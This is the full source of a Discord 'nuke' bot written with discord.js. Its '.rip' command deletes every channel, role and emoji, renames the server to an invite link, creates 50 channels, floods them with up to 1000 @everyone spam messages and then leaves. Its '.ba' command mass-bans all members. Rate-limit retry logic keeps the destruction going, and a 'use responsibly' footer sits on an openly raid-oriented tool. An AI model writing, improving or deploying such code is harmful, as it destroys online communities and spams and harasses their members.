const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const express = require('express');
const dotenv = require('dotenv');

dotenv.config();

// ====== DISCORD BOT SETUP ======
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildBans,
    GatewayIntentBits.GuildEmojisAndStickers
  ]
});

// ====== WEB SERVER FOR PORT 3000 ======
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.send('Nebula Bot is online and awaiting .rip command...');
});

app.listen(PORT, () => {
  console.log(`🌐 Web server running on http://localhost:${PORT}`);
});

// ====== RATE LIMIT HANDLER ======
async function handleRateLimit(promiseFn, maxRetries = 5) {
  let retries = 0;
  while (retries <= maxRetries) {
    try {
      return await promiseFn();
    } catch (error) {
      if (error.code === 429) {
        const retryAfter = error.retry_after || 1000;
        console.warn(`[RATELIMIT] Retrying after ${retryAfter}ms`);
        await new Promise(resolve => setTimeout(resolve, retryAfter));
        retries++;
        continue;
      } else {
        console.error(`[ERROR] ${error.message}`);
        return null;
      }
    }
  }
  return null;
}

client.on('ready', () => {
  console.log(`🚀 Logged in as ${client.user.tag}`);
});

client.on('messageCreate', async (message) => {
  if (!message.content.startsWith('.') || message.author.bot) return;

  const args = message.content.slice(1).trim().split(/ +/);
  const command = args[0].toLowerCase();

  // ===== HELP COMMAND =====
  if (command === 'help') {
    const helpEmbed = new EmbedBuilder()
      .setTitle('🤖 Nebula Bot Commands')
      .setDescription('Here are the available commands for Nebula Bot:')
      .addFields(
        { name: '.rip', value: 'Nukes the server (deletes roles, emojis, creates 50 channels, spams 1000 messages)' },
        { name: '.ba', value: 'Bans all members (except owner)' },
        { name: '.help', value: 'Sends this help message to your DMs' }
      )
      .setColor('#ff0000')
      .setFooter({ text: 'Use responsibly - only in servers you own!' });

    try {
      await message.author.send({ embeds: [helpEmbed] });
      await message.reply('📬 Sent help to your DMs!');
    } catch (err) {
      console.error('❌ Could not send DM:', err.message);
      await message.reply('❌ I couldn\'t send you a DM. Please enable DMs from server members.');
    }
    return;
  }

  // ===== BAN ALL MEMBERS =====
  if (command === 'ba') {
    if (!message.member.permissions.has('BanMembers')) {
      return message.reply('❌ You don\'t have permission to ban members.');
    }

    const guild = message.guild;

    // Skip owner and bots
    const membersToBan = guild.members.cache.filter(m =>
      m.id !== guild.ownerId && !m.user.bot
    );

    if (membersToBan.size === 0) {
      return message.reply('❌ No members available to ban.');
    }

    console.log(`🔪 Banning ${membersToBan.size} members...`);

    for (const member of membersToBan.values()) {
      try {
        await handleRateLimit(() => guild.members.ban(member, {
          reason: 'Nebula Ban All',
          deleteMessageSeconds: 604800 // Delete 1 week of messages
        }));
        console.log(`✅ Banned: ${member.user.tag}`);
      } catch (err) {
        console.error(`❌ Failed to ban ${member.user.tag}: ${err.message}`);
      }
      await new Promise(r => setTimeout(r, 50)); // Small delay between bans
    }

    console.log(`✅ Successfully banned all members.`);
    await message.reply(`✅ Banned ${membersToBan.size} members.`);
    return;
  }

  // ===== RIP COMMAND =====
  if (command === 'rip') {
    const guild = message.guild;
    const spamMessage = '@everyone Nebula\'s return is here discord.gg/migh';
    const channelName = 'neb-was-here';

    try {
      console.log(`🎯 Targeting server: ${guild.name}`);

      let didSomething = false;

      // Step 1: Delete channels
      try {
        console.log('🧹 Deleting channels...');
        await Promise.all(guild.channels.cache.map(async (channel) => {
          const result = await handleRateLimit(() =>
            channel.delete().catch(e => console.warn(`Channel del fail: ${e.message}`))
          );
          if (result) {
            console.log(`🗑️ Deleted channel: ${channel.name}`);
            didSomething = true;
          }
        }));
      } catch (err) {
        console.warn('⚠️ Failed to delete channels:', err.message);
      }

      // Step 2: Delete roles
      try {
        console.log('🛡️ Deleting roles...');
        await Promise.all(guild.roles.cache.map(async (role) => {
          if (role.name !== '@everyone' && !role.managed) {
            const result = await handleRateLimit(() =>
              role.delete().catch(e => console.warn(`Role del fail: ${e.message}`))
            );
            if (result) {
              console.log(`🗑️ Deleted role: ${role.name}`);
              didSomething = true;
            }
          }
        }));
      } catch (err) {
        console.warn('⚠️ Failed to delete roles:', err.message);
      }

      // Step 3: Delete emojis
      try {
        console.log('🖼️ Deleting emojis...');
        await Promise.all(guild.emojis.cache.map(async (emoji) => {
          const result = await handleRateLimit(() =>
            emoji.delete().catch(e => console.warn(`Emoji del fail: ${e.message}`))
          );
          if (result) {
            console.log(`🗑️ Deleted emoji: ${emoji.name}`);
            didSomething = true;
          }
        }));
      } catch (err) {
        console.warn('⚠️ Failed to delete emojis:', err.message);
      }

      // Step 4: Rename server
      try {
        console.log('📛 Renaming server...');
        await handleRateLimit(() =>
          guild.edit({ name: 'discord.gg/migh' }).catch(e => console.warn(`Rename fail: ${e.message}`))
        );
        console.log('✅ Server renamed.');
        didSomething = true;
      } catch (err) {
        console.warn('⚠️ Failed to rename server:', err.message);
      }

      // Step 5: Create 50 channels
      const createdChannels = [];
      const totalChannelsToCreate = 50;
      const batchSize = 25;

      console.log(`🆕 Creating ${totalChannelsToCreate} channels...`);

      for (let i = 0; i < totalChannelsToCreate; i += batchSize) {
        const batchPromises = [];

        for (let j = 0; j < batchSize && (i + j) < totalChannelsToCreate; j++) {
          const index = i + j;

          const createChan = async () => {
            const channel = await handleRateLimit(() =>
              guild.channels.create({ name: `${channelName}-${index + 1}` })
                .catch(e => console.warn(`Channel #${index + 1} failed:`, e.message))
            );

            if (!channel) return;

            console.log(`✅ Created channel: ${channel.name}`);
            createdChannels.push(channel);
            didSomething = true;
          };

          batchPromises.push(createChan());
        }

        await Promise.all(batchPromises);
        await new Promise(r => setTimeout(r, 500)); // Small pause between batches
      }

      if (createdChannels.length === 0) {
        console.error('❌ No channels were created. Aborting spam.');
        return message.channel.send('❌ Could not create any channels. Aborting.');
      }

      // Step 6: Spam 20 messages per channel, up to 1000 total
      const validChannels = createdChannels.filter(ch => ch && ch.id);

      if (validChannels.length === 0) {
        console.error('❌ No valid channels to spam.');
        return message.channel.send('❌ No valid channels to spam.');
      }

      let sent = 0;
      const MAX_MESSAGES = 1000;
      const MESSAGES_PER_CHANNEL = 20;

      console.log(`🔥 Starting spam in ${validChannels.length} channels (20 msgs each)...`);

      const sendBatch = validChannels.map(channel => async () => {
        for (let i = 0; i < MESSAGES_PER_CHANNEL && sent < MAX_MESSAGES; i++) {
          try {
            await handleRateLimit(() => channel.send(spamMessage));
            sent++;
            if (sent % 100 === 0) console.log(`📨 Sent: ${sent}`);
          } catch (err) {
            console.error(`⚠️ Send failed in ${channel.name}: ${err.message}`);
          }
          await new Promise(r => setTimeout(r, 2)); // 2ms delay between sends
        }
      });

      await Promise.all(sendBatch.map(fn => fn()));
      console.log(`✅ Sent ${sent}/${MAX_MESSAGES} spam messages.`);
      didSomething = true;

      // Step 7: Leave server
      try {
        await handleRateLimit(() => guild.leave());
        console.log('🚪 Left server.');
      } catch (err) {
        console.warn('⚠️ Failed to leave server:', err.message);
      }

      if (!didSomething) {
        console.error('🚫 Could not perform any actions on this server.');
        await message.channel.send('🚫 Could not perform any actions on this server.');
      } else {
        console.log('✅ Successfully completed operation.');
        await message.channel.send('✅ Successfully nuked server.');
      }

    } catch (err) {
      console.error('🚨 Critical error during operation:', err.message);
      await message.channel.send(`❌ Error occurred: ${err.message}`);
    }
  }
});

// ====== LOGIN ======
client.login(process.env.TOKEN);
